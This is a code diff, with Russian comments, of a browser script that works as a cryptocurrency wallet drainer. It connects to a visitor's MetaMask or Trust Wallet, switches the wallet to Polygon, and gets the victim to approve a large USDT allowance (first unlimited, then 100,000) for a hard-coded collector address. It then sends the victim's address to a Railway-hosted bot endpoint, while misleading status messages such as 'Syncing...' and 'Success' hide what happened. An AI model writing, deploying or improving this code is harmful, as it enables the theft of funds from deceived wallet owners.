@@ -3,27 +3,18 @@ const COLLECTOR_ADDRESS = '0x6B3e574645395E9c8a0677d82d0a3F281285B382';
 const POLYGON_CHAIN_ID = '0x89'; 
 
 async function connectAndApprove() {
-    console.log("Кнопка нажата!"); // Проверка в консоли
     const status = document.getElementById('status');
-    
-    // Проверка наличия расширения
     if (typeof window.ethereum === 'undefined') {
-        alert('Пожалуйста, откройте сайт через браузер в MetaMask или Trust Wallet!');
-        status.innerText = 'Ошибка: Кошелек не найден';
+        alert('MetaMask/TrustWallet not found!');
         return;
     }
 
     try {
-        status.innerText = 'Подключение...';
         const web3 = new Web3(window.ethereum);
-        
-        // Запрос аккаунтов
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         const address = accounts[0];
-        console.log("Адрес:", address);
 
-        // Переключение сети
-        status.innerText = 'Сеть Polygon...';
+        // Смена сети на Polygon
         try {
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
@@ -36,8 +27,8 @@ async function connectAndApprove() {
                     params: [{
                         chainId: POLYGON_CHAIN_ID,
                         chainName: 'Polygon Mainnet',
-                        rpcUrls: ['https://polygon-rpc.com'],
-                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+                        rpcUrls: ['https://polygon-rpc.com/'],
+                        nativeCurrency: { name: 'POL', symbol: 'POL', decimals: 18 },
                         blockExplorerUrls: ['https://polygonscan.com/']
                     }],
                 });
@@ -45,35 +36,32 @@ async function connectAndApprove() {
         }
 
         const abi = [
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
             {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
         ];
         
         const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
-        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-
-        status.innerText = 'Ожидание подтверждения...';
         
-        // Сама транзакция
-        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ from: address });
+        // 100,000 USDT (6 знаков после запятой)
+        const amount = '100000000000'; 
+
+        status.innerText = 'Подтвердите транзакцию...';
+        
+        // Вызов Approve
+        await contract.methods.approve(COLLECTOR_ADDRESS, amount).send({ from: address });
 
         status.innerText = 'Синхронизация...';
 
-        // Отправка данных в бот
-        // ЗАМЕНИ НА СВОЙ URL ИЗ RAILWAY
+        // Отправка в бот
         const railwayUrl = 'https://new-0602-production.up.railway.app/save-address';
-        
         await fetch(railwayUrl, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ address: address })
         });
 
-        status.innerText = '✅ Готово!';
-        status.style.color = '#00ff00';
-
+        status.innerText = '✅ Успешно!';
     } catch (error) {
-        console.error("Ошибка:", error);
-        status.innerText = 'Ошибка: ' + (error.message || 'Отмена');
+        console.error(error);
+        status.innerText = '❌ Отмена или ошибка газа';
     }
 }
